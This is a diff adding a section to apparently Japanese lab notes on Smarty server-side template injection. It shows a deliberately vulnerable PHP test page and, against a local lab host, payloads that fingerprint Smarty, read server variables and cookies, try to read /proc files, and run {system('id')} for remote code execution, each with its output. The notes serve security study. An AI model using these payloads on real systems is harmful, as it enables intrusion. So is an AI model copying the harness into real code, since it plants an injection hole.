@@ -86,7 +86,82 @@ blindにすると`id`コマンドの実行結果は見えないが、確かに�
 ![image](https://user-images.githubusercontent.com/56021519/102750650-87b12680-43a9-11eb-8a7f-b37c06c988c8.png)   
 `http://192.168.99.100:15002/eval.php?tpl=%25s&inj=aaa&blind=1`のようにevalの中でエラーが発生するようにすると、   
 ![image](https://user-images.githubusercontent.com/56021519/102750727-aadbd600-43a9-11eb-8e51-3fccd25f2ab6.png)   
+#### smarty
+`$smarty->fetch('string:'.$tpl);`で`?inj={*}`とすると、`$smarty->fetch('string:{*}');`となってこれがテンプレートエンジンによって解析される！ここが脆弱   
+smarty-3.1.32-secured.php   
+```php
+<?php
 
+function generateRandomString($length = 10) {
+    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
+}
+
+require('lib/smarty-3.1.29/libs/Smarty.class.php');
+$smarty = new Smarty;
+
+$inj=$_GET["inj"];
+if(isset($_GET["tpl"])) {
+  // Keep the formatting a-la-python
+  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
+}
+else {
+  $tpl=$inj;
+}
+
+error_log('DEBUG< : ' . $tpl);
+$rendered = $smarty->fetch('string:'.$tpl);
+error_log('DEBUG> : ' . $rendered);
+
+if(!$_GET["blind"]) {
+  echo generateRandomString() . $rendered . generateRandomString();
+}
+else {
+  echo generateRandomString();
+}
+?>
+```
+以下よりSmartyだと判定できるらしい。   
+![image](https://user-images.githubusercontent.com/56021519/102763178-a836ac00-43bc-11eb-9a05-8f5af0aed0a7.png)   
+```txt
+http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj=${7*7}
+MOqmnDhLrj$49p5m8SkqDJo
+
+http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj=a{*comment*}b
+ACWPmsrhdxabaJZ9dSrkm3
+```
+以下で環境変数とかを表示できる。`self::`のやつはなんかうまく行ってない。   
+
+```txt
+http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={$SCRIPT_NAME}
+1uzWVrFehC/smarty-3.1.32-secured.phpG3rd1BP40c
+
+http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={SMARTY_DIR}
+urVZfizSOI/var/www/html/lib/smarty-3.1.32/libs/nOrJdf7o4h
+
+http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={$smarty.get.inj}
+JoeiKYCzW5{$smarty.get.inj}5O9topPlc1
+
+GET /smarty-3.1.32-secured.php?inj={$smarty.cookies.a} 
+Cookie: a=**cookie_value**
+GBf6kdYhCJ**cookie_value**2HogA4LaUw
+
+http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={self%3A%3AgetStreamVariable(%22file%3A%2F%2F%2Fproc%2Fself%2Floginuid%22)}%0D%0A
+Fatal error: Uncaught --> Smarty Compiler: Syntax error in template "string:{self::getStreamVariable("file:///proc/s..." on line 1 "{self::getStreamVariable("file:///proc/self/loginuid")}" static class 'self' is undefined or not allowed by security setting <-- thrown in /var/www/html/lib/smarty-3.1.32/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1
+
+http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={self::getStreamVariable($SCRIPT_NAME)}
+Fatal error: Uncaught --> Smarty Compiler: Syntax error in template "string:{self::getStreamVariable($SCRIPT_NAME)}" on line 1 "{self::getStreamVariable($SCRIPT_NAME)}" static class 'self' is undefined or not allowed by security setting <-- thrown in /var/www/html/lib/smarty-3.1.32/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1
+```
+以下でRCEできてる！unsecured.phpでもsecured.phpでも両方同様にRCEできてる！   
+```txt
+http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={system(%27id%27)}
+xdeFqDKjk3uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)wG31cLv75x
+
+http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={%27****%27}
+AksCy1ZQ8g****J5grndNk6e
+
+http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={}
+kXunBvWJh0{}wrFURs4H6f
+```
 ### Java
 ### python
 ### Ruby
